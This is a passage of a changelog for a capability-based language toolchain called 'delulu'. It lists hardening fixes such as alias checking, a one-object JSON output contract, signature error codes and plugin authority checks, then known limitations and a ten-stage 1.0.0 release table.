- **A type alias is now checked where it is written.** `type Meters = Metres` — a typo — used to check
  clean, with the "unknown type" error arriving only at a use site; in a library whose own code never
  uses the alias, that error landed on a consumer who did not make the mistake. Alias targets are now
  resolved at their declaration. Forward references still work (the pass runs once the whole module's
  type names are known), and so do long chains and generic aliases. (C53, ruling D47b)
- **`delulu authority` can now report on a package that has dependencies.** It ran the single-package
  loader while `build`, `check`, `lock` and `authority --diff` all resolve the dependency graph, so
  every package with a dependency was refused with DL0303 ("unknown module") while `build` on the same
  directory succeeded — making the review surface unusable for a monorepo, which is exactly where the
  supply-chain question lives. A `delulu.toml`'s presence now selects the loader, so a plain directory
  of modules still works: `resolve_workspace` requires a manifest, and routing everything through it
  would have traded this bug for that regression. No-dependency reports are byte-identical to before,
  on both surfaces. A library package with no `fn main` is now named after its package rather than the
  placeholder `package`. (C51, ruling D45a)
- **`--json` now emits exactly one object, including on failure.** `docs/for-agents.md` promised
  *"Every `--json` command emits one object"*; on a usage or I/O error — a missing argument, an
  unreadable path, a malformed flag — essentially every subcommand printed a human sentence to stderr
  and exited nonzero with **zero bytes on stdout**. Any programmatic caller got an exit code and nothing
  to parse. Enforced now in one wrapper around the whole dispatch rather than at ~161 individual exit
  sites, with a fallback envelope that sets `summary.errors = 1` and invents no DL code. The gate
  asserts *exactly* one object, which is how it caught the mirror defect twice (`test` and `deploy`
  already printed a report, so the fallback made two). (C2, ruling D38)
- **A 10 KB source file no longer produces 76 MB of diagnostics.** Every diagnostic quoted its whole
  source line, and a 5000-deep field chain is one 10 KB line with ~5000 errors against it — 76,518,387
  bytes in 14.2 seconds. Quoted lines are now windowed to 160 characters around the span, and the human
  render caps at 50 diagnostics with a note stating how many were withheld. `--json` stays uncapped
  because it is a contract to report every diagnostic. Now 23,530 bytes in 0.125 s — a 3,252×
  reduction. (C32, ruling D38)
- **`deploy` and `fleet` are in `--help`.** Both were working top-level subcommands that `--help` never
  listed, which is why a CLI sweep could not find them — and `deploy` was double-emitting JSON on its
  refusal paths. A gate now asserts every dispatched subcommand appears in `--help`, because an
  undocumented command is a command nothing sweeps. (C33, ruling D38)
- **The conformance coverage law now checks that a witness exercises its anchor.** It verified a witness
  test existed and was not `#[ignore]`d, and stopped there — so repointing a rejecting witness at a real
  but unrelated test left the gate reporting **100% coverage** while nothing produced that diagnostic. A
  rejecting witness must now name the code it witnesses; 108 of 109 already did. Accepting witnesses are
  deliberately exempt (they prove a code does *not* fire). (C37, ruling D42)
- **An unsigned artifact and a badly-signed one are different codes.** Both reported DL1705, "signature
  verification failed" — untrue for an unsigned artifact, since nothing was verified. Unsigned is now
  **DL1511**. The distinction is load-bearing: no signature is a policy question, a signature that fails
  to verify is an attack indicator. The project had already ruled this (Stage-6 deviation 8) and the
  plugin path implemented it; only the detached path did not. (C38, ruling D42)
- **`DL0907` describes what it actually covers.** Titled "match reached no arm" while being raised for an
  unbound name, `?` on a non-Result, an assignment to a non-record, an unknown function, and more — so
  `delulu explain DL0907` told readers something false about their own program. It now names the class,
  with the `match` case as the canonical example. (C14, ruling D42)
- **`delulu fmt` no longer merges comment paragraphs.** A blank line between two comment paragraphs was
  deleted, joining them into one block. Neither formatter law could catch it: the identity law's comment
  projection is each comment's text and own-line flag in order, and a merge changes none of those — only
  the spacing *between* comments, which is the part carrying the author's structure. Runs of blank lines
  still collapse to one, and a trailing comment does not create a false paragraph break. (C15, ruling D41)
- **`atlas --format mermaid` now says what it leaves out.** It renders a module-level overview — 3 nodes
  for a graph with 12 — and said so only in a design addendum, while the diagram itself gets pasted into
  READMEs and agent context far from any documentation. A reader could reasonably conclude the program
  had no functions and no effects. The diagram now declares its scope inline, and `--help` does too.
  (C36, ruling D41)
- **Root authority can no longer narrow silently across an actor boundary.** `RootMsg` is a
  hand-written enumeration of what a `Root` carries to an actor, and Stage 10 phase 10h added
  `computes` without extending it — so an actor holding a Root slice lost compute authority and nothing
  said so. Fail-closed, but an omission rather than a decision. A gate now reads both struct definitions
  from source and fails if any dimension neither crosses nor is explicitly listed as withheld, telling
  the maintainer to *decide* rather than to append. Whether `computes` should cross is a capability
  question left to the owner; the restrictive reading stands. (C35, ruling D40)
- **A plugin manifest can no longer declare authority the plugin model cannot confer.** `device`,
  `foreign_c`, and `foreign_python` are hard-coded empty for plugins by design, but a manifest that
  *declared* one had it silently dropped — so the artifact loaded clean while advertising a ceiling it
  did not have, and anyone reading that manifest was told the plugin could reach a device it can never
  reach. Refused now (**DL1508**), naming the dimension; an empty list stays legal because it claims
  nothing. Not exploitable — the drop was toward less authority — but the same defect as C23's inert
  declarations. (C34, ruling D39)
- **A build that checked nothing reported success.** A package whose sources sat beside `delulu.toml`
  instead of under `src/` printed `built clean (1 package(s), 0 module(s))` and exited 0 — a green
  build of an empty program, and a green CI gate with it. It now refuses, on the same posture as the
  deferred-git-dependency gate: a check that could not run must never report success. The closing
  `0 error(s)` line, which read as success beside a nonzero exit, now states the actual reason.
  (C26, ruling D33)
- **Naming a directory where a file belongs gets a sentence, not an OS error code.** `delulu run <dir>`
  reported `Access is denied. (os error 5)` on Windows (and `Is a directory` on Linux) — differently
  misleading on each platform, for a mistake that is natural because `build` *does* take a directory.
  (C27, ruling D33)
- **A user function no longer loses silently to a prelude builtin.** Declaring `fn parse_int` was
  accepted and then never called; the only symptom was a type error at some distant call site naming a
  type the author never wrote. Now **DL0302** where the collision is caused. (C11, ruling D25)
- **The front door was false.** A v1.0.0-tagged tree said "Stage 1 — under construction" and told
  readers to `rustup default stable` against a toolchain pinned to 1.96.1. (C4/P1, ruling D25)

### Known limitations (unchanged by this campaign — see `HARDENING_CAMPAIGN.md` §5)

- **macOS has never been executed.** Windows and Linux are verified green on every commit; there is no
  macOS hardware, so no claim is made. `docs/design/CROSS_PLATFORM_VERIFICATION.md` has the detail.
- **Surface-syntax morphs do not exist.** `docs/design/SYNTAX_MORPH_SPEC.md` is a complete normative
  spec with no implementation; its header previously claimed otherwise. Human-prose *locales* are
  fully built (`delulu locale`). (C22)
- **`type A = B` is ambiguous** in the normative grammar and resolves silently to a single-variant sum,
  so no alias to a bare type name can be written. The disambiguation rule is a public-specification
  decision reserved to the owner. (C28)
- **`ForeignCall` remains an enumerated hole** in the proof rather than a closed one; the language
  bounds foreign *reachability*, never foreign *behaviour*.
- **No driver for any real device ships in-tree**, certification is none under every regime, and
  RFC 0001's comment period is open until 2026-08-05 with two recorded process deviations against it.

---

## [1.0.0] — 2026-07-20

First release. Ten stages, built in order, each against a committed specification:

| Stage | Name | What it added |
|---|---|---|
| 1 | Skeleton | grammar, types, effect rows, capabilities, zero ambient authority |
| 2 | Provenance | packages, dependency authority, the semver-authority law, lockfiles |
| 3 | Containment | the WASM backend and engine parity (invariant 15) |
| 4 | Foreign | C and embedded-Python interop behind a capability-gated fence |
| 5 | Custody | the broker, delegation, revocation, foreign workers, Delulu Guard |
| 6 | Live | plugins, hot load, the `Verified`/`Contained` classes |
| 7 | Concurrent | actors, `Async`, reference capabilities |
| 8 | Surface | LSP, `fmt`, the Atlas code+authority graph, locales |
| 9 | Delulu | release integrity, the conformance coverage law (invariant 42) |
| 10 | Industrial | devices, actuation envelopes, broker federation, adapters |

Full per-stage history, including every deviation ruling, is in `docs/design/STAGE<n>_BUILD_ORDER.md`.
Post-release rulings D19–D23 (device-scoped delegation, broker federation, the first hardware adapter)
are recorded in `STAGE10_BUILD_ORDER.md`.

> The 1.0.0 tag is **local only**. This repository has never been pushed.
